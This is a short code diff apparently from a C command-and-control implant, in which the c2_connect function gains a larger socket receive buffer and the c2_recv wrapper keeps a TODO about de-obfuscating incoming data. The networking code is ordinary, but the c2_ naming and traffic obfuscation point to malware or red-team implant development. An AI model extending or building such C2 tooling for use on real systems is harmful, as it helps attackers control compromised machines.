@@ -38,6 +38,10 @@ SOCKET c2_connect(char* ip, unsigned short port) {
     serverAddr.sin_addr.s_addr = inet_addr(ip);
     serverAddr.sin_port = htons(port);
 
+    // Configure socket to have larger receive buffer
+    unsigned int recvBufferSize = 300*1000; // 300 kilobytes
+    setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVBUF, (char*) &recvBufferSize, sizeof(int));
+
     // Connect to the server
     res = connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
     if (res == SOCKET_ERROR) {
@@ -70,7 +74,6 @@ int c2_send(SOCKET s, char* data, int len) {
 // Wrapper for socket recv
 int c2_recv(SOCKET s, char* buffer, int len) {
     int num_bytes = recv(s, buffer, len, 0);
-
     // TODO: needs de-obfuscation here
 
     // Remove trailing newline
